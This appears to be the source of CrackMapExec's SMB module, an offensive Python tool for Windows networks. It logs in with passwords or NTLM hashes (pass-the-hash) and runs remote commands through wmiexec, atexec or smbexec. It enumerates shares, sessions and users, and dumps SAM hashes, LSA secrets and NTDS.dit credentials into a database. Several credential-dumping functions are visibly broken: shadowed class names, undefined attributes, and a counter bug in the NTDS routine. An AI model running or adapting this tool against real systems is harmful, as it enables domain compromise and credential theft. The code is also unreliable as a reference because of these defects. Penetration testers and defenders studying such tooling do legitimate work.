import socket
import os
import ntpath
from cme.logger import CMEAdapter
from StringIO import StringIO
from impacket.smbconnection import SMBConnection, SessionError
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
from impacket.nmb import NetBIOSError
from impacket.dcerpc.v5.rpcrt import DCERPCException
from cme.connection import *
from cme.protocols.smb.wmiexec import WMIEXEC
from cme.protocols.smb.atexec import TSCH_EXEC
from cme.protocols.smb.smbexec import SMBEXEC
from cme.protocols.smb.smbspider import SMBSpider
from cme.helpers.logger import highlight
from cme.helpers.misc import gen_random_string
from cme.helpers.powershell import create_ps_command
from pywerview.cli.helpers import *
from datetime import datetime

class smb(connection):

    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.hash = None
        self.lmhash = ''
        self.nthash = ''
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        smb_parser = parser.add_parser('smb', help="Own stuff using SMB and/or Active Directory", parents=[std_parser, module_parser])
        smb_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        dgroup = smb_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, help="Domain name")
        dgroup.add_argument("--local-auth", action='store_true', help='Authenticate locally to each target')
        smb_parser.add_argument("--smb-port", type=int, choices={139, 445}, default=445, help="SMB port (default: 445)")
        smb_parser.add_argument("--share", metavar="SHARE", default="C$", help="Specify a share (default: C$)")

        cgroup = smb_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
        cgroup.add_argument("--sam", action='store_true', help='Dump SAM hashes from target systems')
        cgroup.add_argument("--lsa", action='store_true', help='Dump LSA secrets from target systems')
        cgroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, help="Dump the NTDS.dit from target DCs using the specifed method\n(drsuapi is the fastest)")
        #cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history')
        #cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account')
        cgroup.add_argument("--wdigest", choices={'enable', 'disable'}, help="Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1")

        egroup = smb_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
        egroup.add_argument("--shares", action="store_true", help="Enumerate shares and access")
        egroup.add_argument('--uac', action='store_true', help='Checks UAC status')
        egroup.add_argument("--sessions", action='store_true', help='Enumerate active sessions')
        egroup.add_argument('--disks', action='store_true', help='Enumerate disks')
        egroup.add_argument("--users", action='store_true', help='Enumerate local users')
        egroup.add_argument("--groups", action='store_true', help='Enumerate local groups')
        egroup.add_argument("--rid-brute", nargs='?', const=4000, metavar='MAX_RID', help='Enumerate users by bruteforcing RID\'s (default: 4000)')
        egroup.add_argument("--pass-pol", action='store_true', help='Dump password policy')
        egroup.add_argument("--lusers", action='store_true', help='Enumerate logged on users')
        egroup.add_argument("--wmi", metavar='QUERY', type=str, help='Issues the specified WMI query')
        egroup.add_argument("--wmi-namespace", metavar='NAMESPACE', default='//./root/cimv2', help='WMI Namespace (default: //./root/cimv2)')

        sgroup = smb_parser.add_argument_group("Spidering", "Options for spidering shares")
        sgroup.add_argument("--spider", metavar='FOLDER', nargs='?', const='.', type=str, help='Folder to spider (default: root directory)')
        sgroup.add_argument("--content", action='store_true', help='Enable file content searching')
        sgroup.add_argument("--exclude-dirs", type=str, metavar='DIR_LIST', default='', help='Directories to exclude from spidering')
        segroup = sgroup.add_mutually_exclusive_group()
        segroup.add_argument("--pattern", nargs='+', help='Pattern(s) to search for in folders, filenames and file content')
        segroup.add_argument("--regex", nargs='+', help='Regex(s) to search for in folders, filenames and file content')
        sgroup.add_argument("--depth", type=int, default=10, help='Spider recursion depth (default: 10)')

        cgroup = smb_parser.add_argument_group("Command Execution", "Options for executing commands")
        cgroup.add_argument('--exec-method', choices={"wmiexec", "smbexec", "atexec"}, default=None, help="Method to execute the command. Ignored if in MSSQL mode (default: wmiexec)")
        cgroup.add_argument('--force-ps32', action='store_true', help='Force the PowerShell command to run in a 32-bit process')
        cgroup.add_argument('--no-output', action='store_true', help='Do not retrieve command output')
        cegroup = cgroup.add_mutually_exclusive_group()
        cegroup.add_argument("-x", metavar="COMMAND", dest='execute', help="Execute the specified command")
        cegroup.add_argument("-X", metavar="PS_COMMAND", dest='ps_execute', help='Execute the specified PowerShell command')

        return parser

    def proto_logger(self):
        self.logger = CMEAdapter(extra={
                                        'protocol': 'SMB',
                                        'host': self.host,
                                        'port': self.args.smb_port,
                                        'hostname': u'{}'.format(self.hostname)
                                        })

    def enum_host_info(self):
        #Get the remote ip address (in case the target is a hostname)
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
        remote_ip = self.conn.getRemoteHost()

        try:
            self.conn.login('' , '')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.message:
                pass

        self.host = remote_ip
        self.domain   = self.conn.getServerDomain()
        self.hostname = self.conn.getServerName()
        self.server_os = self.conn.getServerOS()

        self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))

        if not self.domain:
            self.domain = self.hostname

        self.db.add_computer(self.host, self.hostname, self.domain, self.server_os)

        try:
            '''
                DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                (go home Windows, you're drunk)
            '''
            self.conn.logoff()
        except:
            pass

        if self.args.domain:
            self.domain = self.args.domain

        if self.args.local_auth:
            self.domain = self.hostname

        #Re-connect since we logged off
        self.create_conn_obj()

    def print_host_info(self):
        self.logger.info(u"{} (name:{}) (domain:{})".format(
                                                            self.server_os,
                                                            self.hostname.decode('utf-8'),
                                                            self.domain.decode('utf-8')
                                                            ))
    def plaintext_login(self, domain, username, password):
        try:
            self.conn.login(username, password, domain)

            self.password = password
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential('plaintext', domain, username, password)

            if self.admin_privs:
                self.db.add_admin_user('plaintext', domain, username, password, self.host)

            out = u'{}\\{}:{} {}'.format(domain.decode('utf-8'),
                                         username.decode('utf-8'),
                                         password.decode('utf-8'),
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{}:{} {} {}'.format(domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        password.decode('utf-8'),
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))

            if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)

            return False

    def hash_login(self, domain, username, ntlm_hash):
        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        try:
            self.conn.login(username, '', domain, lmhash, nthash)

            self.hash = ntlm_hash
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential('hash', domain, username, ntlm_hash)

            if self.admin_privs:
                self.db.add_admin_user('hash', domain, username, ntlm_hash, self.host)

            out = u'{}\\{} {} {}'.format(domain.decode('utf-8'),
                                         username.decode('utf-8'),
                                         ntlm_hash,
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{} {} {} {}'.format(domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        ntlm_hash,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))

            if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)

            return False

    def create_conn_obj(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, self.args.smb_port)
        except socket.error:
            return False

        return True

    def check_if_admin(self):
        lmhash = ''
        nthash = ''

        if self.hash:
            if self.hash.find(':') != -1:
                lmhash, nthash = self.hash.split(':')
            else:
                nthash = self.hash

        self.admin_privs = invoke_checklocaladminaccess(self.host, self.domain, self.username, self.password, lmhash, nthash)

    @requires_admin
    def execute(self, payload=None, get_output=False, methods=None):

        if self.args.exec_method: methods = [self.args.exec_method]
        if not methods : methods = ['wmiexec', 'atexec', 'smbexec']

        if not payload and self.args.execute:
            payload = self.args.execute
            if not self.args.no_output: get_output = True

        for method in methods:

            if method == 'wmiexec':
                try:
                    exec_method = WMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
                    logging.debug('Executed command via wmiexec')
                    break
                except:
                    logging.debug('Error executing command via wmiexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'atexec':
                try:
                    exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
                    logging.debug('Executed command via atexec')
                    break
                except:
                    logging.debug('Error executing command via atexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'smbexec':
                try:
                    exec_method = SMBEXEC(self.host, self.smb_share_name, self.args.smb_port, self.username, self.password, self.domain, self.hash, self.args.share)
                    logging.debug('Executed command via smbexec')
                    break
                except:
                    logging.debug('Error executing command via smbexec, traceback:')
                    logging.debug(format_exc())
                    continue

        if hasattr(self, 'server'): self.server.track_host(self.host)

        output = u'{}'.format(exec_method.execute(payload, get_output).strip().decode('utf-8'))

        if self.args.execute or self.args.ps_execute:
            self.logger.success('Executed command {}'.format('via {}'.format(self.args.exec_method) if self.args.exec_method else ''))
            buf = StringIO(output).readlines()
            for line in buf:
                self.logger.highlight(line.strip())

        return output

    @requires_admin
    def ps_execute(self, payload=None, get_output=False, methods=None):
        if not payload and self.args.ps_execute:
            payload = self.args.ps_execute
            if not self.args.no_output: get_output = True

        return self.execute(create_ps_command(payload), get_output, methods)

    def shares(self):
        temp_dir = ntpath.normpath("\\" + gen_random_string())
        #hostid,_,_,_,_,_,_ = self.db.get_hosts(filterTerm=self.host)[0]
        permissions = []

        try:
            for share in self.conn.listShares():
                share_name = share['shi1_netname'][:-1]
                share_remark = share['shi1_remark'][:-1]
                share_info = {'name': share_name, 'remark': share_remark, 'access': []}
                read = False
                write = False

                try:
                    self.conn.listPath(share_name, '*')
                    read = True
                    share_info['access'].append('READ')
                except SessionError:
                    pass

                try:
                    self.conn.createDirectory(share_name, temp_dir)
                    self.conn.deleteDirectory(share_name, temp_dir)
                    write = True
                    share_info['access'].append('WRITE')
                except SessionError:
                    pass

                permissions.append(share_info)
                #self.db.add_share(hostid, share_name, share_remark, read, write)

            print permissions

        except Exception as e:
            self.logger.error('Error enumerating shares: {}'.format(e))

    #@requires_admin
    #def uac(self):
    #    return UAC(self).enum()

    def sessions(self):
        sessions = get_netsession(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
        print sessions

    def disks(self):
        disks = get_localdisks(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
        print disks

    def groups(self):
        groups = get_netlocalgroup(self.host, None, self.domain, self.username, self.password, self.lmhash, self.nthash, queried_groupname='', list_groups=True, recurse=False)
        print groups

    #def users(self):
    #    return SAMRDump(self).enum()

    #def rid_brute(self):
    #    return LSALookupSid(self).brute_force()

    #def pass_pol(self):
    #    return PassPolDump(self).enum()

    def lusers(self):
        lusers = get_netloggedon(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
        print lusers

    #@requires_admin
    #def wmi(self, wmi_query=None, wmi_namespace='//./root/cimv2'):

    #    if self.args.wmi_namespace:
    #        wmi_namespace = self.args.wmi_namespace

    #    if not wmi_query and self.args.wmi:
    #        wmi_query = self.args.wmi

    #    return WMIQUERY(self).query(wmi_query, wmi_namespace)

    #def spider(self):
    #    spider = SMBSpider(self)
    #    spider.spider(self.args.spider, self.args.depth)
    #    spider.finish()

    #    return spider.results

    def enable_remoteops(self):
        if self.remote_ops is not None and self.bootkey is not None:
            return

        try:
            self.remote_ops  = RemoteOperations(self.conn, False, None) #self.__doKerberos, self.__kdcHost
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.error('RemoteOperations failed: {}'.format(e))

    @requires_admin
    def sam(self):
        self.enable_remoteops()

        if self.remote_ops and self.bootkey:
            try:
                SAMFileName = self.remote_ops.saveSAM()
                SAMHashes   = SAMHashes(SAMFileName, self.bootkey, isRemote=True)

                self.logger.success('Dumping SAM hashes')
                SAMHashes.dump()
                SAMHashes.export(self.output_filename)

                sam_hashes = 0
                with open(self.output_filename + '.sam' , 'r')  as sam_file:
                    for sam_hash  in sam_file:
                        #parse this shizzle here
                        ntlm_hash = ''
                        self.db.add_credential('hash', self.domain, self.username, ntlm_hash, pillaged_from=self.host, local=True)
                        sam_hashes += 1
                self.logger.success('Added {} SAM hashes to the database'.format(highlight(sam_hashes)))

            except Exception as e:
                self.logger.error('SAM hashes extraction failed: {}'.format(e))

            self.remote_ops.finish()
            SAMHashes.finish()

    @requires_admin
    def lsa(self):
        self.enable_remoteops()

        if self.remote_ops and self.bootkey:
            try:
                SECURITYFileName = self.remote_ops.saveSECURITY()

                LSASecrets = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True)

                self.logger.success('Dumping LSA secrets')
                LSASecrets.dumpCachedHashes()
                LSASecrets.exportCached(self.output_filename)
                LSASecrets.dumpSecrets()
                LSASecrets.exportSecrets(self.output_filename)

                secrets = 0
                with open(self.output_filename + '.lsa' , 'r')  as lsa_file:
                    for secret  in lsa_file:
                        #parse this shizzle here
                        self.db.add_credential('lsa', self.domain, self.username, secret, pillaged_from=self.host, local=True)
                        secrets += 1
                self.logger.success('Added {} LSA secrets to the database'.format(highlight(secrets)))

            except Exception as e:
                self.logger.error('LSA hashes extraction failed: {}'.format(e))

            self.remote_ops.finish()
            LSASecrets.finish()

    @requires_admin
    def ntds(self):
        self.enable_remoteops()

        if self.remote_ops and self.bootkey:
            try:
                NTDSFileName = self.remote_ops.saveNTDS()

                NTDSHashes = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=self.__history,
                                               noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                               useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                               pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
                                               printUserStatus= self.__printUserStatus)

                logging.success('Dumping the NTDS, this could take a while so go grab a redbull...')
                NTDSHashes.dump()

                ntds_hashes = 0
                with open(self.output_filename + '.ntds' , 'r')  as ntds_file:
                    for ntds_hash  in ntds_file:
                        #parse this shizzle here
                        self.db.add_ntds_hash(hostid, self.domain, self.username, ntds_hash)
                        ntds_hash += 1
                self.logger.success('Added {} NTDS hashes to the database'.format(highlight(ntds_hashes)))

            except Exception as e:
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resumeFile = NTDSHashes.getResumeSessionFile()
                    if resumeFile is not None:
                        os.unlink(resumeFile)
                self.logger.error(e)
                if self.args.ntds is not 'drsuapi':
                    self.logger.error('Something wen\'t wrong with the DRSUAPI approach. Try again with --ntds vss')

            self.remote_ops.finish()
            NTDSHashes.finish()

    #@requires_admin
    #def wdigest(self):
    #    return getattr(WDIGEST(self), self.args.wdigest)()
